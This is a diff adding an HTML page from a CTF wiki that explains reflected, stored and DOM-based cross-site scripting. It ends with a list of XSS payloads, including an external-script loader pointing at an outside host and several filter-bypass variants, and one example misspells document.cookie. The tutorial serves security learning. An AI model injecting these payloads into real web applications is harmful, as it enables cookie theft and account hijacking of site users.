@@ -1,0 +1,687 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+        <title>Cross Site Scripting (XSS) - CTF_info</title>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        
+        <link rel="canonical" href="https://nacrondx.github.io/ctf-info/Wiki/Cross-Site%20Scripting%20%28XSS%29/">
+        
+
+        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+            <link rel="stylesheet" href="../../assets/css/darcula-highlight.min.css">
+
+        <link rel="stylesheet" href="../../assets/css/bootstrap.min.css">
+        <link rel="stylesheet" href="../../assets/css/dracula-ui.min.css">
+        <link rel="stylesheet" href="../../assets/css/mkdocs.min.css">
+            <link href="../../assets/stylesheets/interactive_graph.css" rel="stylesheet">
+
+        
+            <link  rel="icon" type="image/x-icon" href="../../assets/img/favicon.ico">
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+                <script>hljs.initHighlightingOnLoad();</script>
+
+</head>
+
+<body class="drac-bg-black-secondary drac-text-grey-ternary drac-text drac-scrollbar-purple">
+
+    <main class="d-flex">
+
+        <!-- block sidebar -->
+            <nav id="sidebar" class="sidebar drac-bg-black">
+    <div class="custom-menu">
+        <button type="button" id="sidebarCollapse" class="btn btn-primary">
+            <i class="fa fa-bars"></i>
+            <span class="sr-only">Menu</span>
+        </button>
+    </div>
+
+    <div class="p-4">
+        
+
+        <div class="drac-text-center">
+            
+                <span class="drac-text drac-line-height drac-text-white">CTF_info</span>
+            
+        </div>
+
+        <div class="drac-box flex-column">
+            <ul class="dot-ul">
+                <li><div class="dot-li drac-bg-cyan"></div></li>
+                <li><div class="dot-li drac-bg-green"></div></li>
+                <li><div class="dot-li drac-bg-orange"></div></li>
+                <li><div class="dot-li drac-bg-pink"></div></li>
+                <li><div class="dot-li drac-bg-purple"></div></li>
+                <li><div class="dot-li drac-bg-red"></div></li>
+                <li><div class="dot-li drac-bg-yellow"></div></li>
+            </ul>
+        </div>
+
+        <hr class="drac-divider" />
+
+        <!-- block menu -->
+        <ul class="mb-5 drac-list drac-list-none">
+            
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Home
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../../Tools/"
+                    class="
+                    drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+                    Tools
+                </a>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#ctfs-collapse" aria-expanded="false">
+                    CTFs
+                </a>
+                <div class="collapse" id="ctfs-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="#" class="
+            drac-anchor-secondary btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+            data-bs-toggle="collapse" data-bs-target="#heroctf-v6---2024-collapse" aria-expanded="false">
+            HeroCTF v6   2024
+        </a>
+
+        <div class="collapse" id="heroctf-v6---2024-collapse">
+            <ul class="mb-5 drac-list drac-list-none">
+                    
+    <li class="drac-box-ternary">
+        <a href="#" class="
+            drac-anchor-secondary btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+            data-bs-toggle="collapse" data-bs-target="#steganography-collapse" aria-expanded="false">
+            Steganography
+        </a>
+
+        <div class="collapse" id="steganography-collapse">
+            <ul class="mb-5 drac-list drac-list-none">
+                    
+    <li class="drac-box-ternary">
+        <a href="../../CTFs/HeroCTF%20v6%20-%202024/Steganography/LSD3/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            LSD3
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../../CTFs/HeroCTF%20v6%20-%202024/Steganography/Zipper/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Zipper
+        </a>
+    </li>
+            </ul>
+        </div>
+    </li>
+            </ul>
+        </div>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class="
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#templates-collapse" aria-expanded="false">
+                    Templates
+                </a>
+                <div class="collapse" id="templates-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../../Templates/Write%20up%20template/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Write up template
+        </a>
+    </li>
+                    </ul>
+                </div>
+            </li>
+            <li class="drac-box">
+                <a href="../.."
+                    class=" active 
+                    drac-anchor btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+                    data-bs-toggle="collapse" data-bs-target="#wiki-collapse" aria-expanded="false">
+                    Wiki
+                </a>
+                <div class="collapse" id="wiki-collapse">
+                    <ul class="mb-5 drac-list drac-list-none">
+                            
+    <li class="drac-box-ternary">
+        <a href="../Audacity/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Audacity
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Binwalk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Binwalk
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Burp%20Suite/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Burp Suite
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Cookies/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cookies
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="./"
+            class=" active 
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cross Site Scripting (XSS)
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Deep%20Sound/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Deep Sound
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Exiftool/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Exiftool
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Fcrackzip/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Fcrackzip
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../File%20Magic%20Numbers/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            File Magic Numbers
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../File%20upload%20vulnerability/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            File upload vulnerability
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../HowToLogin/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            HowToLogin
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../ImageMagick/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            ImageMagick
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../John%20The%20Ripper/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            John The Ripper
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Jsteg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Jsteg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Local%20File%20Inclusion/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Local File Inclusion
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../PDFCrack/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            PDFCrack
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Pngcheck/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Pngcheck
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../SQL%20Injection/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            SQL Injection
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Same%20Origin%20Policy/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Same Origin Policy
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Stegcracker/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Stegcracker
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Steghide/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Steghide
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Stegsnow/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Stegsnow
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Strings/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Strings
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Volatility/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Volatility
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../WFuzz/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            WFuzz
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Wireshark/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Wireshark
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Zbarimg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Zbarimg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Zipography/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Zipography
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="../Zsteg/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Zsteg
+        </a>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="#" class="
+            drac-anchor-secondary btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+            data-bs-toggle="collapse" data-bs-target="#volatility-plugins-collapse" aria-expanded="false">
+            Volatility Plugins
+        </a>
+
+        <div class="collapse" id="volatility-plugins-collapse">
+            <ul class="mb-5 drac-list drac-list-none">
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/cmdscan/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Cmdscan
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/consoles/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Consoles
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/dumpfiles/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Dumpfiles
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/envars/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Envars
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/filescan/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Filescan
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/hashdump/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Hashdump
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/imageinfo/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Imageinfo
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/pslist/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Pslist
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../Volatility%20Plugins/pstree/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Pstree
+        </a>
+    </li>
+            </ul>
+        </div>
+    </li>
+                            
+    <li class="drac-box-ternary">
+        <a href="#" class="
+            drac-anchor-secondary btn-toggle d-inline-flex align-items-center border-0 drac-text-purple--hover collapsed"
+            data-bs-toggle="collapse" data-bs-target="#scripts-collapse" aria-expanded="false">
+            Scripts
+        </a>
+
+        <div class="collapse" id="scripts-collapse">
+            <ul class="mb-5 drac-list drac-list-none">
+                    
+    <li class="drac-box-ternary">
+        <a href="../scripts/Hidded%20data%20in%20PNG%20IDAT%20chunk/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Hidded data in PNG IDAT chunk
+        </a>
+    </li>
+                    
+    <li class="drac-box-ternary">
+        <a href="../scripts/Interactive%20shell%20php/"
+            class="
+            drac-anchor d-inline-flex align-items-center border-0 drac-text-purple--hover">
+            Interactive shell php
+        </a>
+    </li>
+            </ul>
+        </div>
+    </li>
+                    </ul>
+                </div>
+            </li>
+        </ul>
+        <!-- endblock -->
+    </div>
+</nav>
+        <!-- endblock -->
+
+        <nav class="divider drac-bg-purple-cyan"></nav>
+
+        <div class="content">
+            <!-- block header -->
+                <header>
+    <nav class="navbar navbar-expand-xl drac-bg-purple">
+        <div class="container-fluid">
+            
+            <button class="navbar-toggler w-100 text-center" type="button" data-bs-toggle="collapse" data-bs-target="#navbarsMenu"
+                aria-controls="navbarsMenu" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+
+            <div class="collapse navbar-collapse flex-column ml-auto" id="navbarsMenu">
+                <ul class="navbar-nav text-md-center">
+
+                    <!-- block preview -->
+                    <li class="nav-item">
+                            
+        <div class="container">
+            <div class="row row-preview">
+                <div class="col">
+                    <a href="../Cookies/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover">
+                        <i class="fa fa-arrow-left"></i> Previous
+                    </a>
+                </div>
+                <div class="col">
+                    <a href="../Deep%20Sound/"
+                        class="btn-preview drac-btn drac-btn-outline drac-text-white drac-text-cyan-green--hover" style="padding-left: 3%;">
+                        Next <i class="fa fa-arrow-right"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block search -->
+                    <li class="nav-item">
+                    </li>
+                    <!--  endblock -->
+
+                    <!-- block source -->
+                    <li class="nav-item">
+                        
+                    </li>
+                    <!--  endblock -->
+
+                </ul>
+            </div>
+
+        </div>
+    </nav>
+</header>
+            <!-- endblock -->
+
+            <!-- block content -->
+                <section class="p-md-5 section-content">
+    <article>
+        <p><p>[HackTricks wiki] (https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
+[Practical CTF wiki] (https://book.jorianwoltjer.com/web/cross-site-scripting-xss)</p>
+<blockquote>
+<p>Cross-site scripting (XSS) is a vulnerability found in web applications. It is a code injection attack where the attacker injects malicious code into web pages which are viewed by other users. It occurs when the user input is not properly filtered.XSS effects differ in a scope from a petty nuisance to momentous security risk, based on the sensitivity of the data handled by the target site and the quality of any security mitigation implemented by the site's admin.</p>
+</blockquote>
+<h3 id="impact">Impact</h3>
+<p>The impact of XSS is boundless. A successful XSS may lead to :
+- Account hijacking
+- Credential stealing
+- Leakage of sensitive data
+- Display text that seems to come from the site owners,(Like phishing)
+- Log keystrokes
+- Redirect to another site
+- Gain access to camera/microphone if the victim has granted access to that site.</p>
+<h3 id="types-of-xss">Types of XSS</h3>
+<ul>
+<li><a href="#reflected-xss">Reflected XSS</a></li>
+<li><a href="#stored-xss">Stored XSS</a></li>
+<li><a href="#dom-based-xss">DOM-based XSS</a></li>
+</ul>
+<h4 id="reflected-xss">Reflected XSS</h4>
+<p>This is the most common type of cross-site scripting vulneribility.Here the payload is a part of HTTP request which should give the HTTP response containing the payload embedded in the page. In this type of attack, the attacker has to deliver the payload to the victim.</p>
+<p>The attacker uses E-mails and other social engineering methods to get the victim click on the link which contains the payload within the link.</p>
+<p><strong>Example</strong>
+Let's see a web page which reflects the input given for id parameter into the web page
+Here the attacker can successfully implement reflected XSS by changing the id parameter to malicious script</p>
+<p>Let's try to pop-up the cookies of the user by injecting a script
+    <code>localhost/xss.php?id=&lt;script&gt;alert(document.cooike)&lt;/script&gt;</code>
+This gives us a pop-up containing cookies in the page. 
+<img alt="xss_reflected.png" src="../img/xss_reflected.png" /></p>
+<h4 id="stored-xss">Stored XSS</h4>
+<p>This the most dangerous cross-site scripting attack. The payload injected by the attacker is permenently stored in the web page and whoever visits the page will end up as a vicim of this attack.</p>
+<p>The most common illustration of this type of XSS is a web page containing commentinig functionality. The attacker comments a malicious script which will be stored in the web page, and when other user who visits this page will be effected by this payload.</p>
+<p><strong>Example</strong>
+Let's see a web page which displays the status given by users.</p>
+<p><img alt="xss_stored_1.png" src="../img/xss_stored_1.png" /></p>
+<p>Now the attacker can give the status as a payload so that it will be stored in the web application and will effect other user</p>
+<p>Let's try to pop-up the alert with the event handler "onerror"</p>
+<pre><code>&lt;img src="" onerror="alert(1)"&gt;
+</code></pre>
+<p><img alt="xss_stored_2.png" src="../img/xss_stored_2.png" /></p>
+<p>On sharing this status the payload will be stored in the application and whoever visits the page gets a pop-up.</p>
+<p><img alt="xss_stored_3.png" src="../img/xss_stored_3.png" /></p>
+<h4 id="dom-based-xss">DOM-based XSS</h4>
+<p>DOM-based XSS doesn't develop in the HTML part rather develop in the DOM (Document Object Model). i.e unlike reflected and stored XSS attacks where you can see the payload reflected in the web application, DOM-based the source code of the web page remains exactly the same. mostly all the HTML documents have a related DOM, containing the objects characterizing the document properties from the perspective of the browser. Whenever a script is executed client-side, the browser equips the code with the DOM of the web page where the script executes, thus, offering admittance to numerous properties of the web page and their values, populated by the browser from its context.</p>
+<p><strong>Example</strong>
+Consider the following page http://example.com/xss.html containing the code</p>
+<pre><code class="language-html">&lt;script&gt;
+    document.write(&quot;&lt;b&gt;Current URL&lt;/b&gt; : &quot; + document.baseURI);
+&lt;/script&gt;
+</code></pre>
+<p>If you send an HTTP request to the web page like this
+    <code>http://example.com/xss.html#&lt;script&gt;alert(1)&lt;/script&gt;</code>
+straightforward enough that your JavaScript code will get executed, as the web page is writing whatsoever you typed in the URL to the page with document. write function. If you glance at the source of the page, you won't see \ because it's all proceeding in the DOM and done by the executed JavaScript code.</p>
+<h5 id="some-payloads">Some payloads</h5>
+<p><strong>Basic payload</strong></p>
+<pre><code class="language-html">&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;script&gt;ipt&gt;
+&lt;img src=x onerror=alert('XSS');&gt;
+&lt;svg
+    onload=alert(1)&gt;
+&lt;body onload=alert(/XSS/.source)&gt;
+&lt;textarea autofocus onfocus=alert(1)&gt;
+</code></pre>
+<p><strong>External payload</strong></p>
+<pre><code class="language-html">&lt;script src=14.rs&gt;
+</code></pre>
+<p><strong>Bypass filter</strong></p>
+<pre><code class="language-html">&lt;sCrIpT&gt;alert(1)&lt;/ScRipt&gt;
+&lt;script x&gt;alert('XSS')&lt;script y&gt;
+eval('ale'+'rt(0)');
+Function(&quot;ale&quot;+&quot;rt(1)&quot;)();
+new Function`al\ert\`6\``;
+setTimeout('ale'+'rt(2)');
+setInterval('ale'+'rt(10)');
+Set.constructor('ale'+'rt(13)')();
+Set.constructor`al\x65rt\x2814\x29```;
+</code></pre></p>
+    </article>
+</section>
+            <!-- endblock -->
+
+            <!-- block footer -->
+                <footer>
+    <div class="d-flex flex-sm-row justify-content-between py-2 border-top drac-text-black drac-bg-cyan-green">
+        <a href="https://github.com/dracula/mkdocs" target="_blank" style="padding-left: 1%;"
+            class="footer-text drac-anchor drac-text-black drac-text-purple--hover">
+            Made with Dracula Theme for MkDocs
+        </a>
+    </div>
+</footer>
+            <!-- endblock -->
+        </div>
+
+    </main>
+
+        <script>var base_url = '../..';</script>
+        <script src="../../assets/js/jquery-3.3.1.slim.min.js"></script>
+        <script src="../../assets/js/bootstrap.bundle.min.js"></script>
+        <script src="../../assets/js/mkdocs.js"></script>
+			<script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js" defer></script>
+			<script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js" defer></script>
+			<script src="../../assets/javascripts/interactive_graph.js" defer></script>
+
+</body>
+
+</html>
